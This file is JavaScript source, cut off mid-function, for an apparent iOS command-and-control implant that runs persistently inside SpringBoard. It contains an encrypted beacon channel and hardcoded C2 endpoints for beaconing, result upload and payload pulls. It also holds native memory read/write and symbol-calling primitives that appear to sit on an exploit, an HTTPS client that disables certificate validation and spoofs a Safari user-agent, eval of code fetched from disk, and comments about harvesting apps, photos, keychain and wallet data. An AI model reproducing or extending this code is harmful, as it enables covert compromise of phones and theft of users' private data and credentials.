// Channel ch1: N7Z2 single-layer, password = hex(session_key). ASCII-only.
// Expects globalThis.__C2_CHANNEL = {sid, key, v, pack} or IPC /tmp/c2_ipc/channel.json
(function (g) {
  if (g.__c2ChannelSeal && g.__c2ChannelOpen) return;

  function __u8(a) { return a instanceof Uint8Array ? a : new Uint8Array(a); }
  function __sha256(data) {
    var K = new Uint32Array([
      0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
      0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
      0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
      0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
      0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
      0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
      0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
      0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
    function rr(x, n) { return (x >>> n) | (x << (32 - n)); }
    var u8 = __u8(data);
    var l = u8.length, bitLen = l * 8;
    var withPad = new Uint8Array(((l + 9 + 63) & ~63));
    withPad.set(u8); withPad[l] = 0x80;
    var dv = new DataView(withPad.buffer);
    dv.setUint32(withPad.length - 4, bitLen >>> 0, false);
    dv.setUint32(withPad.length - 8, Math.floor(bitLen / 0x100000000), false);
    var H = new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]);
    var w = new Uint32Array(64);
    for (var i = 0; i < withPad.length; i += 64) {
      for (var j = 0; j < 16; j++) w[j] = dv.getUint32(i + j * 4, false);
      for (var j = 16; j < 64; j++) {
        var s0 = rr(w[j - 15], 7) ^ rr(w[j - 15], 18) ^ (w[j - 15] >>> 3);
        var s1 = rr(w[j - 2], 17) ^ rr(w[j - 2], 19) ^ (w[j - 2] >>> 10);
        w[j] = (w[j - 16] + s0 + w[j - 7] + s1) >>> 0;
      }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], gg = H[6], h = H[7];
      for (var j = 0; j < 64; j++) {
        var S1 = rr(e, 6) ^ rr(e, 11) ^ rr(e, 25);
        var ch = (e & f) ^ ((~e) & gg);
        var t1 = (h + S1 + ch + K[j] + w[j]) >>> 0;
        var S0 = rr(a, 2) ^ rr(a, 13) ^ rr(a, 22);
        var maj = (a & b) ^ (a & c) ^ (b & c);
        var t2 = (S0 + maj) >>> 0;
        h = gg; gg = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
      }
      H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
      H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + gg) >>> 0; H[7] = (H[7] + h) >>> 0;
    }
    var out = new Uint8Array(32);
    var od = new DataView(out.buffer);
    for (var i = 0; i < 8; i++) od.setUint32(i * 4, H[i], false);
    return out;
  }
  function __hmacSha256(keyBytes, msg) {
    var key = __u8(keyBytes), m = __u8(msg);
    if (key.length > 64) key = __sha256(key);
    var k = new Uint8Array(64); k.set(key);
    var o = new Uint8Array(64), ii = new Uint8Array(64);
    for (var j = 0; j < 64; j++) { o[j] = k[j] ^ 0x5c; ii[j] = k[j] ^ 0x36; }
    var inner = new Uint8Array(64 + m.length); inner.set(ii); inner.set(m, 64);
    var mid = __sha256(inner);
    var outer = new Uint8Array(64 + 32); outer.set(o); outer.set(mid, 64);
    return __sha256(outer);
  }
  function __utf8Encode(str) {
    var out = [], i = 0;
    for (; i < str.length; i++) {
      var c = str.charCodeAt(i);
      if (c < 0x80) out.push(c);
      else if (c < 0x800) { out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
      else if (c >= 0xd800 && c <= 0xdbff) {
        var c2 = str.charCodeAt(++i);
        var cp = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
        out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3f), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f));
      } else {
        out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
      }
    }
    return new Uint8Array(out);
  }
  function __utf8Decode(u8) {
    var s = "", i = 0;
    u8 = __u8(u8);
    while (i < u8.length) {
      var c = u8[i++];
      if (c < 0x80) s += String.fromCharCode(c);
      else if (c < 0xe0) {
        var c2 = u8[i++];
        s += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
      } else if (c < 0xf0) {
        var c2 = u8[i++], c3 = u8[i++];
        s += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
      } else {
        var c2 = u8[i++], c3 = u8[i++], c4 = u8[i++];
        var cp = ((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f);
        cp -= 0x10000;
        s += String.fromCharCode(0xd800 + (cp >> 10), 0xdc00 + (cp & 0x3ff));
      }
    }
    return s;
  }
  function __b64ToU8(b64) {
    var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var s = String(b64 || "").replace(/[^A-Za-z0-9+\/=]/g, "");
    var pad = 0;
    if (s.charAt(s.length - 1) === "=") pad++;
    if (s.charAt(s.length - 2) === "=") pad++;
    s = s.replace(/=+$/, "");
    while (s.length % 4) s += "A";
    var bin = "", i = 0;
    while (i < s.length) {
      var a = B.indexOf(s.charAt(i++)), b = B.indexOf(s.charAt(i++));
      var c = B.indexOf(s.charAt(i++)), d = B.indexOf(s.charAt(i++));
      if (a < 0 || b < 0) break;
      var n = (a << 18) | (b << 12) | ((c < 0 ? 0 : c) << 6) | (d < 0 ? 0 : d);
      bin += String.fromCharCode((n >> 16) & 255, (n >> 8) & 255, n & 255);
    }
    if (pad) bin = bin.slice(0, bin.length - pad);
    var out = new Uint8Array(bin.length);
    for (var j = 0; j < bin.length; j++) out[j] = bin.charCodeAt(j);
    return out;
  }
  function __u8ToB64(u8) {
    var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    u8 = __u8(u8);
    var s = "", i = 0;
    for (; i + 2 < u8.length; i += 3) {
      var n = (u8[i] << 16) | (u8[i + 1] << 8) | u8[i + 2];
      s += B.charAt((n >> 18) & 63) + B.charAt((n >> 12) & 63) + B.charAt((n >> 6) & 63) + B.charAt(n & 63);
    }
    if (i < u8.length) {
      var n2 = u8[i] << 16;
      if (i + 1 < u8.length) n2 |= u8[i + 1] << 8;
      s += B.charAt((n2 >> 18) & 63) + B.charAt((n2 >> 12) & 63) + (i + 1 < u8.length ? B.charAt((n2 >> 6) & 63) : "=") + "=";
    }
    return s;
  }
  function __keystream(key, n) {
    var out = new Uint8Array(n), offset = 0, counter = 0;
    while (offset < n) {
      var buf = new Uint8Array(8), c = counter;
      for (var i = 7; i >= 0; i--) { buf[i] = c & 255; c = Math.floor(c / 256); }
      var block = __hmacSha256(key, buf);
      var take = Math.min(block.length, n - offset);
      out.set(block.subarray(0, take), offset);
      offset += take; counter++;
    }
    return out;
  }
  function __xor(a, b) {
    var o = new Uint8Array(a.length);
    for (var i = 0; i < a.length; i++) o[i] = a[i] ^ b[i];
    return o;
  }
  function __deriveKey(password, salt) {
    return __hmacSha256(__utf8Encode(String(password || "")), salt);
  }
  function __packOnce(password, payloadU8) {
    var salt = new Uint8Array(16);
    for (var i = 0; i < 16; i++) salt[i] = (Math.random() * 256) | 0;
    try {
      if (typeof crypto !== "undefined" && crypto.getRandomValues) crypto.getRandomValues(salt);
    } catch (_) {}
    var key = __deriveKey(password, salt);
    var ct = __xor(__u8(payloadU8), __keystream(key, payloadU8.length));
    var out = new Uint8Array(5 + 16 + ct.length);
    out[0] = 0x4e; out[1] = 0x37; out[2] = 0x5a; out[3] = 0x32; out[4] = 2;
    out.set(salt, 5); out.set(ct, 21);
    return out;
  }
  function __unpackOnce(password, blob) {
    var u8 = typeof blob === "string"
      ? (String(blob).indexOf("N7Z2B:") === 0 ? __b64ToU8(String(blob).slice(6)) : null)
      : __u8(blob);
    if (!u8 || u8.length < 21) throw new Error("ch1 short");
    if (u8[0] !== 0x4e || u8[1] !== 0x37 || u8[2] !== 0x5a || u8[3] !== 0x32 || u8[4] !== 2)
      throw new Error("ch1 magic");
    var salt = u8.subarray(5, 21);
    var ct = u8.subarray(21);
    return __xor(ct, __keystream(__deriveKey(password, salt), ct.length));
  }

  function __c2ChannelGet() {
    try {
      if (g.__C2_CHANNEL && g.__C2_CHANNEL.sid && g.__C2_CHANNEL.key) return g.__C2_CHANNEL;
    } catch (_) {}
    return null;
  }

  function __c2ChannelSeal(plainObjOrStr) {
    var ch = __c2ChannelGet();
    if (!ch) return null;
    var plain = typeof plainObjOrStr === "string" ? plainObjOrStr : JSON.stringify(plainObjOrStr);
    var blob = __packOnce(String(ch.key).toLowerCase(), __utf8Encode(plain));
    return { pack: "ch1", sid: String(ch.sid), enc: "N7Z2B:" + __u8ToB64(blob), v: 1 };
  }

  function __c2ChannelOpen(body) {
    if (!body || body.pack !== "ch1") return body;
    var ch = __c2ChannelGet();
    if (!ch || String(ch.sid) !== String(body.sid || "")) throw new Error("ch1 sid mismatch");
    var raw = __unpackOnce(String(ch.key).toLowerCase(), body.enc);
    var text = __utf8Decode(raw);
    try { return JSON.parse(text); } catch (_) { return text; }
  }

  function __c2ChannelPath(path) {
    var p = String(path || "");
    if (p.indexOf("?") >= 0) p = p.slice(0, p.indexOf("?"));
    if (p === "/beacon" || p === "/result") return true;
    if (p === "/war" || p === "/api/war") return true;
    if (p === "/api/promo/result" || p === "/api/asset/report") return true;
    // Hot module pull: request+response sealed after pe_worker_body issues channel.
    // Bootstrap pe_vm→body still uses N7Z2 (no sid yet).
    if (p === "/api/payload/get") return true;
    return false;
  }

  g.__c2ChannelSeal = __c2ChannelSeal;
  g.__c2ChannelOpen = __c2ChannelOpen;
  g.__c2ChannelPath = __c2ChannelPath;
  g.__c2ChannelGet = __c2ChannelGet;
})(typeof globalThis !== "undefined" ? globalThis : this);
try{if(!globalThis.__C2_CHANNEL){var __chPaths=['/tmp/c2_ipc/channel.json','/tmp/c2_v1/sb/channel.json'];for(var __i=0;__i<__chPaths.length;__i++){try{var __p=__chPaths[__i];if(typeof readFileUtf8==='function'){var __s=readFileUtf8(__p);if(__s){globalThis.__C2_CHANNEL=JSON.parse(__s);break;}}}catch(_e){}}}}catch(_ch0){}
// C2 Agent Payload - persistent loop in SpringBoard
// Communicates with command.py via HTTP, runs until reboot
// Prefer pe_worker IPC /tmp/c2_ipc/c2_endpoints.json (baked PELOG set);
// only if missing / unreadable / no live match → hard C2_PIN_BASE.
// UUID and device model are obtained natively at runtime

// Debug pin: hardcode public C2 (skip pe endpoints file / lab LAN).
// Flip C2_FORCE_PIN off once SB agent boot is proven.
var C2_PIN_BASE = "http://192.168.31.32:9090";
var C2_BEACON_URL = "http://192.168.31.32:9090/beacon";
var C2_RESULT_URL = "http://192.168.31.32:9090/result";
var C2_CHANNEL_CODE = "201314";
var HQ_API_BASE = "http://192.168.31.32:9090";
var HQ_WALLET_PORT = "9090";
const C2_FORCE_PIN = true;
// Runtime list (filled by _resolveC2Endpoints from pe file or pin).
var C2_HOSTS = [];
var C2_REPORT_HOSTS = [];
var C2_ENDPOINTS_FROM = "embedded";
// Stable C2: skip Phase-2 HQ auto-collect (apps/photos/keychain poll) - prevents SpringBoard respring
// Notes (/nb) always run outside this flag via report hosts.
const C2_STABLE_MODE = true;
const PE_V1_LAYER = true;
// Hot flags published to /tmp/c2_ipc/agent_flags.json at UUID/hb time (before pe pipeline).
// pe_worker reads this file; flip here, no pe pack after the reader is on-device.
const C2_TG_PAUSED = true;
// pe_main pelog switch (default ON in pe). Agent load writes pe_pelog.json; false mutes HTTP /pelog.
const C2_PELOG_ON = false;
const PE_V1_IPC_ROOT = "/tmp/c2_v1";
const _rawBigInt = BigInt;
const MAX_FILE_SIZE = 2 * 1024 * 1024;
const CHUNK_SIZE    = 1024 * 1024;


// ============================================================================
// Native Class (shared nativeCallBuff + invoker pattern)
// ============================================================================

class Native {
	static #baseAddr;
	static #dlsymAddr;
	static #memcpyAddr;
	static #mallocAddr;
	static #oinvAddr;

	static mem = 0n;
	static memSize = 0x4000;

	static #argMem = 0n;
	static #argMemPtr = 0n;
	static #argMemPtrStr = 0n;
	static #argPtr = 0n;
	static #argPtrPtr = 0n;
	static #argPtrStrPtr = 0n;
	static #dlsymCache = {};

	static init() {
		const buff = new BigUint64Array(nativeCallBuff);
		this.#baseAddr   = buff[20];
		this.#dlsymAddr  = buff[21];
		this.#memcpyAddr = buff[22];
		this.#mallocAddr = buff[23];
		this.#oinvAddr   = buff[24];

		this.mem          = this.#nativeCallAddr(this.#mallocAddr, Native.asBigInt(this.memSize));
		this.#argMem      = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtr   = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtrStr= this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argPtr      = this.#argMem;
		this.#argPtrPtr   = this.#argMemPtr;
		this.#argPtrStrPtr= this.#argMemPtrStr;
	}

	static write(ptr, buff) {
		if (!ptr) return false;
		let buff8 = new Uint8Array(nativeCallBuff);
		let offs = 0, left = buff.byteLength;
		while (left) {
			let len = left > 0x1000 ? 0x1000 : left;
			buff8.set(new Uint8Array(buff, offs, len), 0x1000);
			this.#nativeCallAddr(this.#memcpyAddr, ptr + Native.asBigInt(offs), this.#baseAddr + 0x1000n, Native.asBigInt(len));
			left -= len; offs += len;
		}
		return true;
	}

	static read(ptr, length) {
		if (!ptr) return null;
		let buff = new ArrayBuffer(length);
		let buff8 = new Uint8Array(buff);
		let offs = 0, left = length;
		while (left) {
			let len = left > 0x1000 ? 0x1000 : left;
			this.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + Native.asBigInt(offs), Native.asBigInt(len));
			buff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);
			left -= len; offs += len;
		}
		return buff;
	}

	static readPtr(ptr) {
		const v = new DataView(this.read(ptr, 8));
		return v.getBigUint64(0, true);
	}
	static read32(ptr) {
		const v = new DataView(this.read(ptr, 4));
		return v.getInt32(0, true);
	}
	static write64(ptr, value) {
		const b = new ArrayBuffer(8);
		new DataView(b).setBigUint64(0, value, true);
		this.write(ptr, b);
	}

	static readString(ptr, len=1024) {
		return this.bytesToString(this.read(ptr, len), false);
	}
	static writeString(ptr, str) {
		this.write(ptr, this.stringToBytes(str, true));
	}

	static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0); x1 = this.#toNative(x1);
		x2 = this.#toNative(x2); x3 = this.#toNative(x3);
		x4 = this.#toNative(x4); x5 = this.#toNative(x5);
		x6 = this.#toNative(x6); x7 = this.#toNative(x7);
		let ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);
		this.#argPtr = this.#argMem;
		return ret;
	}

	static bytesToString(bytes, includeNull=true) {
		let a = new Uint8Array(bytes), s = "";
		for (let i = 0; i < a.length; i++) {
			if (!includeNull && !a[i]) break;
			s += String.fromCharCode(a[i]);
		}
		return s;
	}
	static stringToBytes(str, nullTerm=false) {
		let b = new ArrayBuffer(str.length + (nullTerm ? 1 : 0));
		let a = new Uint8Array(b);
		for (let i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);
		if (nullTerm) a[str.length] = 0;
		return a.buffer;
	}

	static asBigInt(v) {
		if (typeof v === 'bigint') return v;
		if (typeof v === 'number') {
			if (!Number.isFinite(v)) return 0n;
			return _rawBigInt(Math.trunc(v));
		}
		if (typeof v === 'boolean') return v ? 1n : 0n;
		if (typeof v === 'string') {
			const s = v.trim();
			if (!s) return 0n;
			try { return _rawBigInt(s); } catch (_) { return 0n; }
		}
		if (v == null || v === false) return 0n;
		try {
			const n = Number(v);
			if (Number.isFinite(n)) return _rawBigInt(Math.trunc(n));
		} catch (_) {}
		return 0n;
	}

	static #toNative(v) {
		if (!v && v !== 0 && v !== 0n) return 0n;
		if (typeof v === 'string') {
			if (v.length >= 0x1000) return 0n;
			let ptr = this.#argPtr;
			this.writeString(ptr, v);
			this.#argPtr += Native.asBigInt(v.length + 1);
			return ptr;
		}
		return Native.asBigInt(v);
	}

	static #dlsym(name) {
		if (!name) return 0n;
		let a = this.#dlsymCache[name];
		if (a) return a;
		const RTLD_DEFAULT = 0xfffffffffffffffen;
		const nb = this.stringToBytes(name, true);
		new Uint8Array(nativeCallBuff).set(new Uint8Array(nb), 0x1000);
		a = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);
		if (a) this.#dlsymCache[name] = a;
		return a;
	}

	static #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {
		let b = new BigInt64Array(nativeCallBuff);
		b[0]=addr; b[100]=x0; b[101]=x1; b[102]=x2; b[103]=x3;
		b[104]=x4; b[105]=x5; b[106]=x6; b[107]=x7;
		invoker();
		return b[200];
	}

	static #nativeCallSymbol(name, ...args) {
		const addr = this.#dlsym(name);
		const r = this.#nativeCallAddr(addr, ...args);
		if (r < 0xffffffffn && r > -0xffffffffn) return Number(r);
		return r;
	}
}

// ============================================================================
// URL Parsing
// ============================================================================

function parseURL(url) {
	let host = "", port = 80, path = "/";
	let s = url;
	if (s.indexOf("https://") === 0) { s = s.substring(8); port = 443; }
	else if (s.indexOf("http://") === 0) s = s.substring(7);
	const sl = s.indexOf("/");
	if (sl >= 0) { path = s.substring(sl); s = s.substring(0, sl); }
	const cl = s.indexOf(":");
	if (cl >= 0) { host = s.substring(0, cl); port = parseInt(s.substring(cl + 1)); }
	else host = s;
	return { host, port, path };
}

// ============================================================================
// Base64
// ============================================================================

const B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

function bytesToBase64(bytes) {
	let r = "";
	for (let i = 0; i < bytes.length; i += 3) {
		const a = bytes[i], b = i+1 < bytes.length ? bytes[i+1] : 0, c = i+2 < bytes.length ? bytes[i+2] : 0;
		r += B64[a >> 2];
		r += B64[((a & 3) << 4) | (b >> 4)];
		r += i+1 < bytes.length ? B64[((b & 15) << 2) | (c >> 6)] : "=";
		r += i+2 < bytes.length ? B64[c & 63] : "=";
	}
	return r;
}

// ============================================================================
// POSIX Socket HTTP Client (http:// only, LAN testing)
// ============================================================================

function _sendBytes(fd, str) {
	const SZ = 4096;
	let sent = 0;
	const buf = Native.callSymbol("malloc", Native.asBigInt(SZ + 1));
	while (sent < str.length) {
		const end = sent + SZ < str.length ? sent + SZ : str.length;
		const part = str.substring(sent, end);
		Native.writeString(buf, part);
		const n = Number(Native.callSymbol("write", fd, buf, part.length));
		if (n <= 0) break;
		sent += n;
	}
	Native.callSymbol("free", buf);
}

function _recvAll(fd) {
	const SZ = 16384;
	const buf = Native.callSymbol("malloc", Native.asBigInt(SZ));
	let result = "";
	for (let ri = 0; ri < 256; ri++) {
		const n = Number(Native.callSymbol("read", fd, buf, SZ - 1));
		if (n <= 0) break;
		result += Native.readString(buf, n);
	}
	Native.callSymbol("free", buf);
	return result;
}

function _socketPost(host, port, path, bodyStr) {
	const fd = Number(Native.callSymbol("socket", 2, 1, 0));
	if (fd <= 0) return null;

	try {
		const tv = Native.callSymbol("malloc", 16n);
		Native.write64(tv, 15n);
		Native.write64(tv + 8n, 0n);
		Native.callSymbol("setsockopt", fd, 0xFFFF, 0x1005, tv, 16);
		Native.callSymbol("setsockopt", fd, 0xFFFF, 0x1006, tv, 16);
		Native.callSymbol("free", tv);

		const sa = Native.callSymbol("calloc", 1, 16);
		const sab = new ArrayBuffer(16);
		const sv = new DataView(sab);
		sv.setUint8(0, 16);
		sv.setUint8(1, 2);
		sv.setUint16(2, port, false);
		const p = host.split(".");
		sv.setUint8(4, parseInt(p[0]));
		sv.setUint8(5, parseInt(p[1]));
		sv.setUint8(6, parseInt(p[2]));
		sv.setUint8(7, parseInt(p[3]));
		Native.write(sa, sab);

		const cr = Number(Native.callSymbol("connect", fd, sa, 16));
		Native.callSymbol("free", sa);
		if (cr !== 0) return null;

		const hdr = "POST " + path + " HTTP/1.0\r\nHost: " + host + "\r\nContent-Type: application/json\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1\r\nContent-Length: " + bodyStr.length + "\r\n\r\n";
		_sendBytes(fd, hdr);
		_sendBytes(fd, bodyStr);

		const resp = _recvAll(fd);
		const idx = resp.indexOf("\r\n\r\n");
		if (idx < 0) return null;
		try { return JSON.parse(resp.substring(idx + 4)); } catch(e) { return null; }
	} finally {
		Native.callSymbol("close", fd);
	}
}

// ============================================================================
// CFStream HTTPS Client (https:// - production with Nginx/Cloudflare)
// ============================================================================

const _RTLD_DEFAULT = 0xfffffffffffffffen;

function _makeCFString(str) {
	var buf = Native.callSymbol("malloc", str.length + 1);
	Native.writeString(buf, str);
	var cfs = Native.callSymbol("CFStringCreateWithCString", 0n, buf, 0x08000100);
	Native.callSymbol("free", buf);
	return cfs;
}

function _getGlobalCF(name) {
	var addr = Native.callSymbol("dlsym", _RTLD_DEFAULT, name);
	if (!addr || addr === 0n) return 0n;
	return Native.readPtr(Native.asBigInt(addr));
}

function _getGlobalCFSafe(name) {
	var val = _getGlobalCF(name);
	if (val && val !== 0n) return val;
	return _makeCFString(name);
}

function _cfstreamPost(host, port, path, bodyStr) {
	var hostCF = _makeCFString(host);
	if (!hostCF || hostCF === 0n) return null;

	var rPtr = Native.callSymbol("calloc", 1, 8);
	var wPtr = Native.callSymbol("calloc", 1, 8);

	try {
		Native.callSymbol("CFStreamCreatePairWithSocketToHost",
			0n, hostCF, port, Native.asBigInt(rPtr), Native.asBigInt(wPtr));

		var rs = Native.readPtr(Native.asBigInt(rPtr));
		var ws = Native.readPtr(Native.asBigInt(wPtr));

		Native.callSymbol("CFRelease", hostCF);
		hostCF = 0n;
		Native.callSymbol("free", Native.asBigInt(rPtr));
		Native.callSymbol("free", Native.asBigInt(wPtr));
		rPtr = 0n; wPtr = 0n;

		if (!rs || rs === 0n || !ws || ws === 0n) return null;

		try {
			var kLevel = _getGlobalCFSafe("kCFStreamPropertySocketSecurityLevel");
			var kNeg   = _getGlobalCFSafe("kCFStreamSocketSecurityLevelNegotiatedSSL");

			if (kLevel && kNeg) {
				Native.callSymbol("CFWriteStreamSetProperty", ws, kLevel, kNeg);
				Native.callSymbol("CFReadStreamSetProperty",  rs, kLevel, kNeg);
			}

			var kSSL     = _getGlobalCFSafe("kCFStreamPropertySSLSettings");
			var kValCert = _getGlobalCFSafe("kCFStreamSSLValidatesCertificateChain");
			var kFalse   = _getGlobalCF("kCFBooleanFalse");
			var kKeyCB   = Native.callSymbol("dlsym", _RTLD_DEFAULT, "kCFTypeDictionaryKeyCallBacks");
			var kValCB   = Native.callSymbol("dlsym", _RTLD_DEFAULT, "kCFTypeDictionaryValueCallBacks");

			if (kSSL && kValCert && kFalse && kKeyCB && kValCB) {
				var dict = Native.callSymbol("CFDictionaryCreateMutable",
					0n, 2, Native.asBigInt(kKeyCB), Native.asBigInt(kValCB));
				if (dict && dict !== 0n) {
					Native.callSymbol("CFDictionarySetValue", dict, kValCert, kFalse);
					Native.callSymbol("CFWriteStreamSetProperty", ws, kSSL, dict);
					Native.callSymbol("CFReadStreamSetProperty",  rs, kSSL, dict);
					Native.callSymbol("CFRelease", dict);
				}
			}

			Native.callSymbol("CFWriteStreamOpen", ws);
			Native.callSymbol("CFReadStreamOpen",  rs);

			var ready = false;
			for (var wi = 0; wi < 80; wi++) {
				var st = Number(Native.callSymbol("CFWriteStreamGetStatus", ws));
				if (st === 2) { ready = true; break; }
				if (st >= 5) break;
				Native.callSymbol("usleep", 100000);
			}
			if (!ready) return null;

			var hdr = "POST " + path + " HTTP/1.0\r\nHost: " + host +
				"\r\nContent-Type: application/json" +
				"\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1" +
				"\r\nContent-Length: " + bodyStr.length + "\r\n\r\n";
			var fullReq = hdr + bodyStr;
			var reqBuf = Native.callSymbol("malloc", fullReq.length + 1);
			Native.writeString(reqBuf, fullReq);

			var totalSent = 0;
			while (totalSent < fullReq.length) {
				var nw = Number(Native.callSymbol("CFWriteStreamWrite",
					ws, Native.asBigInt(reqBuf) + Native.asBigInt(totalSent),
					fullReq.length - totalSent));
				if (nw <= 0) break;
				totalSent += nw;
			}
			Native.callSymbol("free", Native.asBigInt(reqBuf));
			if (totalSent < fullReq.length) return null;

			var respBuf = Native.callSymbol("malloc", 65536);
			var result = "";
			for (var ri = 0; ri < 50; ri++) {
				var br = Number(Native.callSymbol("CFReadStreamRead",
					rs, Native.asBigInt(respBuf), 65535));
				if (br <= 0) break;
				result += Native.readString(Native.asBigInt(respBuf), br);
			}
			Native.callSymbol("free", Native.asBigInt(respBuf));

			var idx = result.indexOf("\r\n\r\n");
			if (idx < 0) return null;
			try { return JSON.parse(result.substring(idx + 4)); } catch(e) { return null; }

		} finally {
			Native.callSymbol("CFReadStreamClose",  rs);
			Native.callSymbol("CFWriteStreamClose", ws);
			Native.callSymbol("CFRelease", rs);
			Native.callSymbol("CFRelease", ws);
		}
	} finally {
		if (hostCF && hostCF !== 0n) Native.callSymbol("CFRelease", hostCF);
		if (rPtr && rPtr !== 0n) Native.callSymbol("free", Native.asBigInt(rPtr));
		if (wPtr && wPtr !== 0n) Native.callSymbol("free", Native.asBigInt(wPtr));
	}
}

function _writeLog(msg) {
	try {
		var ts = new Date().toISOString();
		var line = "[" + ts + "] " + msg + "\n";
		var fd = Number(Native.callSymbol("open", "/tmp/c2_wallet_debug.log", 0x209, 0x1FF));
		if (fd > 0) {
			var buf = Native.callSymbol("malloc", line.length + 1);
			Native.writeString(buf, line);
			Native.callSymbol("write", fd, buf, line.length);
			Native.callSymbol("free", buf);
			Native.callSymbol("close", fd);
		}
	} catch(e) {}
}

// ============================================================================
// httpPost - dual mode (https -> CFStream TLS, http -> POSIX socket)
// ============================================================================

// Load ch1 helpers from PE IPC (never splice into inject blob — SB eval die).
// Do NOT enable during boot: eval+HMAC while PE still holds SpringBoard RC → desktop respring.
// Wire stays clear until __c2EnableChannelWire() after RC destroy window (beacon loop).
function __c2EnsureChannelHelpers() {
	if (typeof globalThis.__c2ChannelSeal === "function"
		&& typeof globalThis.__c2ChannelOpen === "function"
		&& typeof globalThis.__c2ChannelPath === "function") {
		return true;
	}
	if (globalThis.__c2ChannelHelpersTried) {
		return typeof globalThis.__c2ChannelSeal === "function";
	}
	globalThis.__c2ChannelHelpersTried = true;
	var paths = ["/tmp/c2_ipc/channel_crypto_min.js", "/tmp/c2_v1/sb/channel_crypto_min.js"];
	for (var i = 0; i < paths.length; i++) {
		try {
			var bytes = _readFileBytes(paths[i], 200000);
			if (!bytes || bytes.length < 200) continue;
			var src = _rawToStr(bytes);
			if (src.indexOf("__c2ChannelSeal") < 0) continue;
			try { (0, eval)(src); } catch (_ev) { continue; }
			if (typeof globalThis.__c2ChannelSeal === "function") {
				try { _c2Log("[C2-AGENT] ch1 helpers loaded via=" + paths[i]); } catch (_) {}
				return true;
			}
		} catch (_) {}
	}
	try { _c2Log("[C2-AGENT] ch1 helpers missing - wire stays clear"); } catch (_) {}
	return false;
}

function __c2ChannelWireOn() {
	return !!globalThis.__C2_CH1_WIRE;
}

function __c2EnableChannelWire(reason) {
	if (globalThis.__C2_CH1_WIRE) return true;
	try { __c2EnsureChannelHelpers(); } catch (_) {}
	if (typeof globalThis.__c2ChannelSeal !== "function") {
		try { _c2Log("[C2-AGENT] ch1 wire skip - no helpers reason=" + (reason || "")); } catch (_) {}
		return false;
	}
	if (!globalThis.__C2_CHANNEL) {
		var __chPaths = ["/tmp/c2_ipc/channel.json", "/tmp/c2_v1/sb/channel.json"];
		for (var __ci = 0; __ci < __chPaths.length; __ci++) {
			try {
				var __cb = _readFileBytes(__chPaths[__ci], 4096);
				if (__cb && __cb.length) {
					var __co = JSON.parse(_rawToStr(__cb));
					if (__co && __co.sid && __co.key) {
						globalThis.__C2_CHANNEL = __co;
						break;
					}
				}
			} catch (_) {}
		}
	}
	if (!(globalThis.__C2_CHANNEL && globalThis.__C2_CHANNEL.sid && globalThis.__C2_CHANNEL.key)) {
		try { _c2Log("[C2-AGENT] ch1 wire skip - no channel.json reason=" + (reason || "")); } catch (_) {}
		return false;
	}
	globalThis.__C2_CH1_WIRE = true;
	try {
		_c2Log("[C2-AGENT] ch1 wire ON reason=" + (reason || "loop") +
